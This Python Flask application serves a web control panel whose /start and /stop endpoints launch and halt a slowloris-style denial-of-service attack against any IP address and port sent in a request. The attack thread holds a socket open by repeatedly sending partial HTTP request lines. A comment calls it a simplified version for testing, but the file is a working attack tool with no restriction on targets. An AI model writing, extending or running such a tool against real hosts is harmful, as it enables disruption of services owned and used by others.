import threading
from flask import Flask, request, jsonify, render_template
import time
import socket
import os

app = Flask(__name__)

# Ensure stop_attack is initialized as a threading event
stop_attack = threading.Event()

# Define slowloris attack function (simplified version for testing)
def slowloris_attack(ip, port):
    try:
        # Create a socket and initiate a connection
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10)
        client.connect((ip, port))
        
        # Send data to keep the connection open
        while not stop_attack.is_set():
            client.send(b"GET / HTTP/1.1\r\n")
            time.sleep(1)  # Slow down the request to simulate slowloris
        client.close()
    except Exception as e:
        print(f"Error in attack: {e}")

@app.route('/')
def index():
    # This will render the index.html file stored in the templates folder
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_attack():
    global stop_attack
    stop_attack.clear()  # Reset the stop_attack event to allow attack to start
    
    ip = request.json.get('ip')
    port = int(request.json.get('port', 80))

    if not ip or not port:
        return jsonify({'status': 'error', 'message': 'IP and port are required'})

    # Start the attack in a separate thread
    try:
        thread = threading.Thread(target=slowloris_attack, args=(ip, port))
        thread.daemon = True
        thread.start()
        return jsonify({'status': 'success', 'message': 'Attack started'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stop', methods=['POST'])
def stop_attack_route():
    global stop_attack
    stop_attack.set()  # Stop the attack by setting the event
    return jsonify({'status': 'success', 'message': 'Attack stopped'})

if __name__ == "__main__":
    # Ensure that the "templates" folder exists and index.html is inside it
    app.run(host='0.0.0.0', port=5000)
